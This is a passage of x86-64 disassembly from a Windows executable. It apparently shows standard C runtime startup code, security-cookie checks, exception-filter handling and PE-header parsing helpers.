   140008258:	48 3b c3             	cmp    %rbx,%rax
   14000825b:	75 1a                	jne    0x140008277
   14000825d:	bf 01 00 00 00       	mov    $0x1,%edi
   140008262:	8b 05 18 49 00 00    	mov    0x4918(%rip),%eax        # 0x14000cb80
   140008268:	83 f8 01             	cmp    $0x1,%eax
   14000826b:	75 17                	jne    0x140008284
   14000826d:	8d 48 1e             	lea    0x1e(%rax),%ecx
   140008270:	e8 ee 05 00 00       	call   0x140008863
   140008275:	eb 7a                	jmp    0x1400082f1
   140008277:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   14000827c:	ff 15 7e 11 00 00    	call   *0x117e(%rip)        # 0x140009400
   140008282:	eb c7                	jmp    0x14000824b
   140008284:	8b 05 f6 48 00 00    	mov    0x48f6(%rip),%eax        # 0x14000cb80
   14000828a:	85 c0                	test   %eax,%eax
   14000828c:	75 59                	jne    0x1400082e7
   14000828e:	c7 05 e8 48 00 00 01 	movl   $0x1,0x48e8(%rip)        # 0x14000cb80
   140008295:	00 00 00 
   140008298:	4c 8d 35 e9 13 00 00 	lea    0x13e9(%rip),%r14        # 0x140009688
   14000829f:	48 8d 1d ca 13 00 00 	lea    0x13ca(%rip),%rbx        # 0x140009670
   1400082a6:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400082ab:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400082af:	49 3b de             	cmp    %r14,%rbx
   1400082b2:	73 25                	jae    0x1400082d9
   1400082b4:	85 c0                	test   %eax,%eax
   1400082b6:	75 25                	jne    0x1400082dd
   1400082b8:	48 83 3b 00          	cmpq   $0x0,(%rbx)
   1400082bc:	74 10                	je     0x1400082ce
   1400082be:	48 8b 03             	mov    (%rbx),%rax
   1400082c1:	48 8b 0d 88 13 00 00 	mov    0x1388(%rip),%rcx        # 0x140009650
   1400082c8:	ff d1                	call   *%rcx
   1400082ca:	89 44 24 24          	mov    %eax,0x24(%rsp)
   1400082ce:	48 83 c3 08          	add    $0x8,%rbx
   1400082d2:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400082d7:	eb d6                	jmp    0x1400082af
   1400082d9:	85 c0                	test   %eax,%eax
   1400082db:	74 14                	je     0x1400082f1
   1400082dd:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400082e2:	e9 5d 01 00 00       	jmp    0x140008444
   1400082e7:	c7 05 33 3f 00 00 01 	movl   $0x1,0x3f33(%rip)        # 0x14000c224
   1400082ee:	00 00 00 
   1400082f1:	8b 05 89 48 00 00    	mov    0x4889(%rip),%eax        # 0x14000cb80
   1400082f7:	83 f8 01             	cmp    $0x1,%eax
   1400082fa:	75 1d                	jne    0x140008319
   1400082fc:	48 8d 15 65 13 00 00 	lea    0x1365(%rip),%rdx        # 0x140009668
   140008303:	48 8d 0d 4e 13 00 00 	lea    0x134e(%rip),%rcx        # 0x140009658
   14000830a:	e8 2f 07 00 00       	call   0x140008a3e
   14000830f:	c7 05 67 48 00 00 02 	movl   $0x2,0x4867(%rip)        # 0x14000cb80
   140008316:	00 00 00 
   140008319:	85 ff                	test   %edi,%edi
   14000831b:	75 09                	jne    0x140008326
   14000831d:	33 c0                	xor    %eax,%eax
   14000831f:	48 87 05 52 48 00 00 	xchg   %rax,0x4852(%rip)        # 0x14000cb78
   140008326:	48 83 3d 5a 48 00 00 	cmpq   $0x0,0x485a(%rip)        # 0x14000cb88
   14000832d:	00 
   14000832e:	74 2a                	je     0x14000835a
   140008330:	48 8d 0d 51 48 00 00 	lea    0x4851(%rip),%rcx        # 0x14000cb88
   140008337:	e8 94 05 00 00       	call   0x1400088d0
   14000833c:	85 c0                	test   %eax,%eax
   14000833e:	74 1a                	je     0x14000835a
   140008340:	45 33 c0             	xor    %r8d,%r8d
   140008343:	41 8d 50 02          	lea    0x2(%r8),%edx
   140008347:	33 c9                	xor    %ecx,%ecx
   140008349:	48 8b 05 38 48 00 00 	mov    0x4838(%rip),%rax        # 0x14000cb88
   140008350:	4c 8b 0d f9 12 00 00 	mov    0x12f9(%rip),%r9        # 0x140009650
   140008357:	41 ff d1             	call   *%r9
   14000835a:	48 8b 05 5f 12 00 00 	mov    0x125f(%rip),%rax        # 0x1400095c0
   140008361:	48 8b 18             	mov    (%rax),%rbx
   140008364:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008369:	8b 7c 24 20          	mov    0x20(%rsp),%edi
   14000836d:	0f b6 0b             	movzbl (%rbx),%ecx
   140008370:	80 f9 20             	cmp    $0x20,%cl
   140008373:	77 71                	ja     0x1400083e6
   140008375:	84 c9                	test   %cl,%cl
   140008377:	74 04                	je     0x14000837d
   140008379:	85 ff                	test   %edi,%edi
   14000837b:	75 69                	jne    0x1400083e6
   14000837d:	fe c9                	dec    %cl
   14000837f:	80 f9 1f             	cmp    $0x1f,%cl
   140008382:	77 0c                	ja     0x140008390
   140008384:	48 ff c3             	inc    %rbx
   140008387:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000838c:	8a 0b                	mov    (%rbx),%cl
   14000838e:	eb ed                	jmp    0x14000837d
   140008390:	f6 44 24 7c 01       	testb  $0x1,0x7c(%rsp)
   140008395:	0f b7 84 24 80 00 00 	movzwl 0x80(%rsp),%eax
   14000839c:	00 
   14000839d:	41 b9 0a 00 00 00    	mov    $0xa,%r9d
   1400083a3:	44 0f 45 c8          	cmovne %eax,%r9d
   1400083a7:	4c 8b c3             	mov    %rbx,%r8
   1400083aa:	33 d2                	xor    %edx,%edx
   1400083ac:	48 8d 0d 4d 7c ff ff 	lea    -0x83b3(%rip),%rcx        # 0x140000000
   1400083b3:	e8 9c a8 ff ff       	call   0x140002c54
   1400083b8:	89 05 62 3e 00 00    	mov    %eax,0x3e62(%rip)        # 0x14000c220
   1400083be:	83 3d 7b 3e 00 00 00 	cmpl   $0x0,0x3e7b(%rip)        # 0x14000c240
   1400083c5:	75 08                	jne    0x1400083cf
   1400083c7:	8b c8                	mov    %eax,%ecx
   1400083c9:	ff 15 29 12 00 00    	call   *0x1229(%rip)        # 0x1400095f8
   1400083cf:	83 3d 4e 3e 00 00 00 	cmpl   $0x0,0x3e4e(%rip)        # 0x14000c224
   1400083d6:	75 0c                	jne    0x1400083e4
   1400083d8:	ff 15 0a 12 00 00    	call   *0x120a(%rip)        # 0x1400095e8
   1400083de:	8b 05 3c 3e 00 00    	mov    0x3e3c(%rip),%eax        # 0x14000c220
   1400083e4:	eb 5e                	jmp    0x140008444
   1400083e6:	80 f9 22             	cmp    $0x22,%cl
   1400083e9:	75 0d                	jne    0x1400083f8
   1400083eb:	33 c0                	xor    %eax,%eax
   1400083ed:	85 ff                	test   %edi,%edi
   1400083ef:	0f 94 c0             	sete   %al
   1400083f2:	8b f8                	mov    %eax,%edi
   1400083f4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400083f8:	ff 15 e2 11 00 00    	call   *0x11e2(%rip)        # 0x1400095e0
   1400083fe:	85 c0                	test   %eax,%eax
   140008400:	74 08                	je     0x14000840a
   140008402:	48 ff c3             	inc    %rbx
   140008405:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   14000840a:	48 ff c3             	inc    %rbx
   14000840d:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140008412:	e9 56 ff ff ff       	jmp    0x14000836d
   140008417:	89 05 03 3e 00 00    	mov    %eax,0x3e03(%rip)        # 0x14000c220
   14000841d:	83 3d 1c 3e 00 00 00 	cmpl   $0x0,0x3e1c(%rip)        # 0x14000c240
   140008424:	75 09                	jne    0x14000842f
   140008426:	8b c8                	mov    %eax,%ecx
   140008428:	ff 15 c2 11 00 00    	call   *0x11c2(%rip)        # 0x1400095f0
   14000842e:	cc                   	int3
   14000842f:	83 3d ee 3d 00 00 00 	cmpl   $0x0,0x3dee(%rip)        # 0x14000c224
   140008436:	75 0c                	jne    0x140008444
   140008438:	ff 15 aa 11 00 00    	call   *0x11aa(%rip)        # 0x1400095e8
   14000843e:	8b 05 dc 3d 00 00    	mov    0x3ddc(%rip),%eax        # 0x14000c220
   140008444:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   14000844b:	00 
   14000844c:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140008450:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140008454:	49 8b e3             	mov    %r11,%rsp
   140008457:	41 5e                	pop    %r14
   140008459:	c3                   	ret
   14000845a:	cc                   	int3
   14000845b:	cc                   	int3
   14000845c:	cc                   	int3
   14000845d:	cc                   	int3
   14000845e:	cc                   	int3
   14000845f:	cc                   	int3
   140008460:	cc                   	int3
   140008461:	cc                   	int3
   140008462:	cc                   	int3
   140008463:	cc                   	int3
   140008464:	cc                   	int3
   140008465:	cc                   	int3
   140008466:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000846d:	00 00 00 
   140008470:	48 3b 0d 91 3b 00 00 	cmp    0x3b91(%rip),%rcx        # 0x14000c008
   140008477:	75 10                	jne    0x140008489
   140008479:	48 c1 c1 10          	rol    $0x10,%rcx
   14000847d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140008482:	75 01                	jne    0x140008485
   140008484:	c3                   	ret
   140008485:	48 c1 c9 10          	ror    $0x10,%rcx
   140008489:	e9 42 00 00 00       	jmp    0x1400084d0
   14000848e:	cc                   	int3
   14000848f:	cc                   	int3
   140008490:	cc                   	int3
   140008491:	cc                   	int3
   140008492:	cc                   	int3
   140008493:	cc                   	int3
   140008494:	40 53                	rex push %rbx
   140008496:	48 83 ec 20          	sub    $0x20,%rsp
   14000849a:	48 8b d9             	mov    %rcx,%rbx
   14000849d:	33 c9                	xor    %ecx,%ecx
   14000849f:	ff 15 8b 0f 00 00    	call   *0xf8b(%rip)        # 0x140009430
   1400084a5:	48 8b cb             	mov    %rbx,%rcx
   1400084a8:	ff 15 7a 0f 00 00    	call   *0xf7a(%rip)        # 0x140009428
   1400084ae:	ff 15 2c 0f 00 00    	call   *0xf2c(%rip)        # 0x1400093e0
   1400084b4:	48 8b c8             	mov    %rax,%rcx
   1400084b7:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   1400084bc:	48 83 c4 20          	add    $0x20,%rsp
   1400084c0:	5b                   	pop    %rbx
   1400084c1:	48 ff 25 70 0f 00 00 	rex.W jmp *0xf70(%rip)        # 0x140009438
   1400084c8:	cc                   	int3
   1400084c9:	cc                   	int3
   1400084ca:	cc                   	int3
   1400084cb:	cc                   	int3
   1400084cc:	cc                   	int3
   1400084cd:	cc                   	int3
   1400084ce:	cc                   	int3
   1400084cf:	cc                   	int3
   1400084d0:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400084d5:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400084dc:	48 8d 0d 0d 3e 00 00 	lea    0x3e0d(%rip),%rcx        # 0x14000c2f0
   1400084e3:	ff 15 27 0f 00 00    	call   *0xf27(%rip)        # 0x140009410
   1400084e9:	48 8b 05 f8 3e 00 00 	mov    0x3ef8(%rip),%rax        # 0x14000c3e8
   1400084f0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400084f5:	45 33 c0             	xor    %r8d,%r8d
   1400084f8:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400084fd:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140008502:	ff 15 10 0f 00 00    	call   *0xf10(%rip)        # 0x140009418
   140008508:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000850d:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   140008513:	74 42                	je     0x140008557
   140008515:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000851c:	00 00 
   14000851e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140008523:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008528:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000852d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008532:	48 8d 05 b7 3d 00 00 	lea    0x3db7(%rip),%rax        # 0x14000c2f0
   140008539:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000853e:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   140008543:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140008548:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   14000854d:	33 c9                	xor    %ecx,%ecx
   14000854f:	ff 15 cb 0e 00 00    	call   *0xecb(%rip)        # 0x140009420
   140008555:	eb 23                	jmp    0x14000857a
   140008557:	48 8b 05 2a 3e 00 00 	mov    0x3e2a(%rip),%rax        # 0x14000c388
   14000855e:	48 8b 00             	mov    (%rax),%rax
   140008561:	48 89 05 80 3e 00 00 	mov    %rax,0x3e80(%rip)        # 0x14000c3e8
   140008568:	48 8b 05 19 3e 00 00 	mov    0x3e19(%rip),%rax        # 0x14000c388
   14000856f:	48 83 c0 08          	add    $0x8,%rax
   140008573:	48 89 05 0e 3e 00 00 	mov    %rax,0x3e0e(%rip)        # 0x14000c388
   14000857a:	48 8b 05 67 3e 00 00 	mov    0x3e67(%rip),%rax        # 0x14000c3e8
   140008581:	48 89 05 d8 3c 00 00 	mov    %rax,0x3cd8(%rip)        # 0x14000c260
   140008588:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   14000858f:	00 
   140008590:	48 89 05 d9 3d 00 00 	mov    %rax,0x3dd9(%rip)        # 0x14000c370
   140008597:	c7 05 af 3c 00 00 09 	movl   $0xc0000409,0x3caf(%rip)        # 0x14000c250
   14000859e:	04 00 c0 
   1400085a1:	c7 05 a9 3c 00 00 01 	movl   $0x1,0x3ca9(%rip)        # 0x14000c254
   1400085a8:	00 00 00 
   1400085ab:	c7 05 b3 3c 00 00 03 	movl   $0x3,0x3cb3(%rip)        # 0x14000c268
   1400085b2:	00 00 00 
   1400085b5:	b8 08 00 00 00       	mov    $0x8,%eax
   1400085ba:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400085be:	48 8d 0d ab 3c 00 00 	lea    0x3cab(%rip),%rcx        # 0x14000c270
   1400085c5:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400085cc:	00 
   1400085cd:	b8 08 00 00 00       	mov    $0x8,%eax
   1400085d2:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400085d6:	48 8d 0d 93 3c 00 00 	lea    0x3c93(%rip),%rcx        # 0x14000c270
   1400085dd:	48 8b 15 24 3a 00 00 	mov    0x3a24(%rip),%rdx        # 0x14000c008
   1400085e4:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400085e8:	b8 08 00 00 00       	mov    $0x8,%eax
   1400085ed:	48 6b c0 02          	imul   $0x2,%rax,%rax
   1400085f1:	48 8d 0d 78 3c 00 00 	lea    0x3c78(%rip),%rcx        # 0x14000c270
   1400085f8:	48 8b 15 11 3a 00 00 	mov    0x3a11(%rip),%rdx        # 0x14000c010
   1400085ff:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   140008603:	b8 08 00 00 00       	mov    $0x8,%eax
   140008608:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000860c:	48 8b 0d f5 39 00 00 	mov    0x39f5(%rip),%rcx        # 0x14000c008
   140008613:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   140008618:	b8 08 00 00 00       	mov    $0x8,%eax
   14000861d:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140008621:	48 8b 0d e8 39 00 00 	mov    0x39e8(%rip),%rcx        # 0x14000c010
   140008628:	48 89 4c 04 68       	mov    %rcx,0x68(%rsp,%rax,1)
   14000862d:	48 8d 0d cc 09 00 00 	lea    0x9cc(%rip),%rcx        # 0x140009000
   140008634:	e8 5b fe ff ff       	call   0x140008494
   140008639:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   140008640:	c3                   	ret
   140008641:	cc                   	int3
   140008642:	cc                   	int3
   140008643:	cc                   	int3
   140008644:	cc                   	int3
   140008645:	cc                   	int3
   140008646:	cc                   	int3
   140008647:	cc                   	int3
   140008648:	48 83 ec 78          	sub    $0x78,%rsp
   14000864c:	48 8d 0d 9d 3c 00 00 	lea    0x3c9d(%rip),%rcx        # 0x14000c2f0
   140008653:	ff 15 b7 0d 00 00    	call   *0xdb7(%rip)        # 0x140009410
   140008659:	48 8b 05 88 3d 00 00 	mov    0x3d88(%rip),%rax        # 0x14000c3e8
   140008660:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140008665:	45 33 c0             	xor    %r8d,%r8d
   140008668:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000866d:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140008672:	ff 15 a0 0d 00 00    	call   *0xda0(%rip)        # 0x140009418
   140008678:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000867d:	48 83 7c 24 40 00    	cmpq   $0x0,0x40(%rsp)
   140008683:	74 42                	je     0x1400086c7
   140008685:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000868c:	00 00 
   14000868e:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140008693:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140008698:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   14000869d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400086a2:	48 8d 05 47 3c 00 00 	lea    0x3c47(%rip),%rax        # 0x14000c2f0
   1400086a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400086ae:	4c 8b 4c 24 40       	mov    0x40(%rsp),%r9
   1400086b3:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   1400086b8:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   1400086bd:	33 c9                	xor    %ecx,%ecx
   1400086bf:	ff 15 5b 0d 00 00    	call   *0xd5b(%rip)        # 0x140009420
   1400086c5:	eb 23                	jmp    0x1400086ea
   1400086c7:	48 8b 05 ba 3c 00 00 	mov    0x3cba(%rip),%rax        # 0x14000c388
   1400086ce:	48 8b 00             	mov    (%rax),%rax
   1400086d1:	48 89 05 10 3d 00 00 	mov    %rax,0x3d10(%rip)        # 0x14000c3e8
   1400086d8:	48 8b 05 a9 3c 00 00 	mov    0x3ca9(%rip),%rax        # 0x14000c388
   1400086df:	48 83 c0 08          	add    $0x8,%rax
   1400086e3:	48 89 05 9e 3c 00 00 	mov    %rax,0x3c9e(%rip)        # 0x14000c388
   1400086ea:	48 8b 05 f7 3c 00 00 	mov    0x3cf7(%rip),%rax        # 0x14000c3e8
   1400086f1:	48 89 05 68 3b 00 00 	mov    %rax,0x3b68(%rip)        # 0x14000c260
   1400086f8:	c7 05 4e 3b 00 00 09 	movl   $0xc0000409,0x3b4e(%rip)        # 0x14000c250
   1400086ff:	04 00 c0 
   140008702:	c7 05 48 3b 00 00 01 	movl   $0x1,0x3b48(%rip)        # 0x14000c254
   140008709:	00 00 00 
   14000870c:	c7 05 52 3b 00 00 01 	movl   $0x1,0x3b52(%rip)        # 0x14000c268
   140008713:	00 00 00 
   140008716:	b8 08 00 00 00       	mov    $0x8,%eax
   14000871b:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000871f:	48 8d 0d 4a 3b 00 00 	lea    0x3b4a(%rip),%rcx        # 0x14000c270
   140008726:	48 c7 04 01 08 00 00 	movq   $0x8,(%rcx,%rax,1)
   14000872d:	00 
   14000872e:	48 8d 0d cb 08 00 00 	lea    0x8cb(%rip),%rcx        # 0x140009000
   140008735:	e8 5a fd ff ff       	call   0x140008494
   14000873a:	48 83 c4 78          	add    $0x78,%rsp
   14000873e:	c3                   	ret
   14000873f:	cc                   	int3
   140008740:	cc                   	int3
   140008741:	cc                   	int3
   140008742:	cc                   	int3
   140008743:	cc                   	int3
   140008744:	cc                   	int3
   140008745:	cc                   	int3
   140008746:	cc                   	int3
   140008747:	cc                   	int3
   140008748:	cc                   	int3
   140008749:	cc                   	int3
   14000874a:	cc                   	int3
   14000874b:	cc                   	int3
   14000874c:	cc                   	int3
   14000874d:	cc                   	int3
   14000874e:	cc                   	int3
   14000874f:	cc                   	int3
   140008750:	48 83 ec 28          	sub    $0x28,%rsp
   140008754:	48 8b 01             	mov    (%rcx),%rax
   140008757:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000875d:	75 23                	jne    0x140008782
   14000875f:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   140008763:	75 1d                	jne    0x140008782
   140008765:	8b 48 20             	mov    0x20(%rax),%ecx
   140008768:	8d 81 e0 fa 6c e6    	lea    -0x19930520(%rcx),%eax
   14000876e:	83 f8 02             	cmp    $0x2,%eax
   140008771:	76 08                	jbe    0x14000877b
   140008773:	81 f9 00 40 99 01    	cmp    $0x1994000,%ecx
   140008779:	75 07                	jne    0x140008782
   14000877b:	ff 15 27 0e 00 00    	call   *0xe27(%rip)        # 0x1400095a8
   140008781:	cc                   	int3
   140008782:	33 c0                	xor    %eax,%eax
   140008784:	48 83 c4 28          	add    $0x28,%rsp
   140008788:	c3                   	ret
   140008789:	cc                   	int3
   14000878a:	cc                   	int3
   14000878b:	cc                   	int3
   14000878c:	cc                   	int3
   14000878d:	cc                   	int3
   14000878e:	cc                   	int3
   14000878f:	cc                   	int3
   140008790:	48 83 ec 28          	sub    $0x28,%rsp
   140008794:	48 8d 0d b5 ff ff ff 	lea    -0x4b(%rip),%rcx        # 0x140008750
   14000879b:	ff 15 8f 0c 00 00    	call   *0xc8f(%rip)        # 0x140009430
   1400087a1:	33 c0                	xor    %eax,%eax
   1400087a3:	48 83 c4 28          	add    $0x28,%rsp
   1400087a7:	c3                   	ret
   1400087a8:	cc                   	int3
   1400087a9:	cc                   	int3
   1400087aa:	cc                   	int3
   1400087ab:	cc                   	int3
   1400087ac:	cc                   	int3
   1400087ad:	cc                   	int3
   1400087ae:	ff 25 64 0e 00 00    	jmp    *0xe64(%rip)        # 0x140009618
   1400087b4:	cc                   	int3
   1400087b5:	cc                   	int3
   1400087b6:	cc                   	int3
   1400087b7:	cc                   	int3
   1400087b8:	cc                   	int3
   1400087b9:	cc                   	int3
   1400087ba:	cc                   	int3
   1400087bb:	cc                   	int3
   1400087bc:	48 83 ec 18          	sub    $0x18,%rsp
   1400087c0:	33 d2                	xor    %edx,%edx
   1400087c2:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400087c6:	48 83 f8 fd          	cmp    $0xfffffffffffffffd,%rax
   1400087ca:	77 3c                	ja     0x140008808
   1400087cc:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1400087d1:	66 39 01             	cmp    %ax,(%rcx)
   1400087d4:	75 2a                	jne    0x140008800
   1400087d6:	39 51 3c             	cmp    %edx,0x3c(%rcx)
   1400087d9:	7c 25                	jl     0x140008800
   1400087db:	81 79 3c 00 00 00 10 	cmpl   $0x10000000,0x3c(%rcx)
   1400087e2:	73 1c                	jae    0x140008800
   1400087e4:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   1400087e8:	48 03 c1             	add    %rcx,%rax
   1400087eb:	48 89 04 24          	mov    %rax,(%rsp)
   1400087ef:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400087f5:	48 0f 45 c2          	cmovne %rdx,%rax
   1400087f9:	48 8b d0             	mov    %rax,%rdx
   1400087fc:	48 89 04 24          	mov    %rax,(%rsp)
   140008800:	eb 06                	jmp    0x140008808
   140008802:	33 d2                	xor    %edx,%edx
   140008804:	48 89 14 24          	mov    %rdx,(%rsp)
   140008808:	48 8b c2             	mov    %rdx,%rax
   14000880b:	48 83 c4 18          	add    $0x18,%rsp
   14000880f:	c3                   	ret
   140008810:	cc                   	int3
   140008811:	cc                   	int3
   140008812:	cc                   	int3
   140008813:	cc                   	int3
   140008814:	cc                   	int3
   140008815:	cc                   	int3
   140008816:	cc                   	int3
   140008817:	cc                   	int3
   140008818:	40 53                	rex push %rbx
   14000881a:	48 83 ec 20          	sub    $0x20,%rsp
   14000881e:	8b d9                	mov    %ecx,%ebx
   140008820:	33 c9                	xor    %ecx,%ecx
   140008822:	ff 15 60 0b 00 00    	call   *0xb60(%rip)        # 0x140009388
   140008828:	48 85 c0             	test   %rax,%rax
   14000882b:	74 28                	je     0x140008855
   14000882d:	48 8b c8             	mov    %rax,%rcx
   140008830:	e8 87 ff ff ff       	call   0x1400087bc
   140008835:	48 85 c0             	test   %rax,%rax
   140008838:	74 1b                	je     0x140008855
   14000883a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000883f:	66 39 48 5c          	cmp    %cx,0x5c(%rax)
   140008843:	75 04                	jne    0x140008849
   140008845:	8b c1                	mov    %ecx,%eax
   140008847:	eb 0e                	jmp    0x140008857
   140008849:	66 83 78 5c 03       	cmpw   $0x3,0x5c(%rax)
   14000884e:	b8 01 00 00 00       	mov    $0x1,%eax
   140008853:	74 02                	je     0x140008857
   140008855:	8b c3                	mov    %ebx,%eax
   140008857:	48 83 c4 20          	add    $0x20,%rsp
   14000885b:	5b                   	pop    %rbx
   14000885c:	c3                   	ret
   14000885d:	cc                   	int3
   14000885e:	cc                   	int3
   14000885f:	cc                   	int3
   140008860:	cc                   	int3
   140008861:	cc                   	int3
   140008862:	cc                   	int3
   140008863:	ff 25 a7 0d 00 00    	jmp    *0xda7(%rip)        # 0x140009610
   140008869:	cc                   	int3
   14000886a:	cc                   	int3
   14000886b:	cc                   	int3
   14000886c:	cc                   	int3
   14000886d:	cc                   	int3
   14000886e:	cc                   	int3
   14000886f:	cc                   	int3
   140008870:	33 c0                	xor    %eax,%eax
   140008872:	c3                   	ret
   140008873:	cc                   	int3
   140008874:	cc                   	int3
   140008875:	cc                   	int3
   140008876:	cc                   	int3
   140008877:	cc                   	int3
   140008878:	cc                   	int3
   140008879:	cc                   	int3
   14000887a:	cc                   	int3
   14000887b:	cc                   	int3
   14000887c:	cc                   	int3
   14000887d:	cc                   	int3
   14000887e:	cc                   	int3
   14000887f:	cc                   	int3
   140008880:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   140008884:	45 33 c9             	xor    %r9d,%r9d
   140008887:	4c 03 c1             	add    %rcx,%r8
   14000888a:	4c 8b d2             	mov    %rdx,%r10
   14000888d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140008892:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   140008897:	48 83 c0 18          	add    $0x18,%rax
   14000889b:	49 03 c0             	add    %r8,%rax
   14000889e:	45 85 db             	test   %r11d,%r11d
   1400088a1:	74 1e                	je     0x1400088c1
   1400088a3:	8b 50 0c             	mov    0xc(%rax),%edx
   1400088a6:	4c 3b d2             	cmp    %rdx,%r10
   1400088a9:	72 0a                	jb     0x1400088b5
   1400088ab:	8b 48 08             	mov    0x8(%rax),%ecx
   1400088ae:	03 ca                	add    %edx,%ecx
   1400088b0:	4c 3b d1             	cmp    %rcx,%r10
   1400088b3:	72 0e                	jb     0x1400088c3
   1400088b5:	41 ff c1             	inc    %r9d
   1400088b8:	48 83 c0 28          	add    $0x28,%rax
   1400088bc:	45 3b cb             	cmp    %r11d,%r9d
   1400088bf:	72 e2                	jb     0x1400088a3
   1400088c1:	33 c0                	xor    %eax,%eax
   1400088c3:	c3                   	ret
   1400088c4:	cc                   	int3
   1400088c5:	cc                   	int3
   1400088c6:	cc                   	int3
   1400088c7:	cc                   	int3
   1400088c8:	cc                   	int3
   1400088c9:	cc                   	int3
   1400088ca:	cc                   	int3
   1400088cb:	cc                   	int3
   1400088cc:	cc                   	int3
   1400088cd:	cc                   	int3
   1400088ce:	cc                   	int3
   1400088cf:	cc                   	int3
   1400088d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400088d5:	57                   	push   %rdi
   1400088d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400088da:	48 8b d9             	mov    %rcx,%rbx
   1400088dd:	48 8d 3d 1c 77 ff ff 	lea    -0x88e4(%rip),%rdi        # 0x140000000
   1400088e4:	48 8b cf             	mov    %rdi,%rcx
   1400088e7:	e8 44 00 00 00       	call   0x140008930
   1400088ec:	85 c0                	test   %eax,%eax
   1400088ee:	74 22                	je     0x140008912
   1400088f0:	48 2b df             	sub    %rdi,%rbx
   1400088f3:	48 8b d3             	mov    %rbx,%rdx
   1400088f6:	48 8b cf             	mov    %rdi,%rcx
   1400088f9:	e8 82 ff ff ff       	call   0x140008880
   1400088fe:	48 85 c0             	test   %rax,%rax
   140008901:	74 0f                	je     0x140008912
   140008903:	8b 40 24             	mov    0x24(%rax),%eax
   140008906:	c1 e8 1f             	shr    $0x1f,%eax
   140008909:	f7 d0                	not    %eax
   14000890b:	83 e0 01             	and    $0x1,%eax
   14000890e:	eb 02                	jmp    0x140008912
   140008910:	33 c0                	xor    %eax,%eax
   140008912:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008917:	48 83 c4 20          	add    $0x20,%rsp
   14000891b:	5f                   	pop    %rdi
   14000891c:	c3                   	ret
   14000891d:	cc                   	int3
   14000891e:	cc                   	int3
   14000891f:	cc                   	int3
   140008920:	cc                   	int3
   140008921:	cc                   	int3
   140008922:	cc                   	int3
   140008923:	cc                   	int3
   140008924:	cc                   	int3
   140008925:	cc                   	int3
   140008926:	cc                   	int3
   140008927:	cc                   	int3
   140008928:	cc                   	int3
   140008929:	cc                   	int3
   14000892a:	cc                   	int3
   14000892b:	cc                   	int3
   14000892c:	cc                   	int3
   14000892d:	cc                   	int3
   14000892e:	cc                   	int3
   14000892f:	cc                   	int3
   140008930:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140008935:	66 39 01             	cmp    %ax,(%rcx)
